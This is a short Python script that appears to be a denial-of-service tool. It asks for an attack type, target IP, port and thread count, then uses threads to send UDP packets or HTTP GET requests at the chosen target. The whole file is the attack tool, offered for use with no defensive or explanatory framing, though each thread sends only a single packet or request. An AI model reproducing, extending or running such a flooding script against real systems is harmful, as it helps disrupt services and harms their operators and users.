import socket
import requests
from concurrent.futures import ThreadPoolExecutor


def udp_flood(target_ip, target_port):
    print("Sending UDP packet to {}:{}".format(target_ip, target_port))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(b'Hello, World!', (target_ip, target_port))
    sock.close()


def http_flood(target_ip, target_port):
    target_url = "http://{}:{}".format(target_ip, target_port)
    print("Sending HTTP request to {}".format(target_url))
    try:
        requests.get(target_url)
    except requests.exceptions.RequestException:
        pass


def start_attack(attack_type, target_ip, target_port, num_threads):
    if attack_type not in ('udp', 'http'):
        print("Invalid attack type")
        return

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        if attack_type == 'udp':
            executor.map(udp_flood, [target_ip]*num_threads, [target_port]*num_threads)
        elif attack_type == 'http':
            executor.map(http_flood, [target_ip]*num_threads, [target_port]*num_threads)


# Get user input
attack_type = input("Choose attack type (udp/http): ")
target_ip = input("Enter target IP address: ")
target_port = int(input("Enter target port: "))
num_threads = int(input("Enter number of threads: "))

# Start the attack with user input
start_attack(attack_type, target_ip, target_port, num_threads)
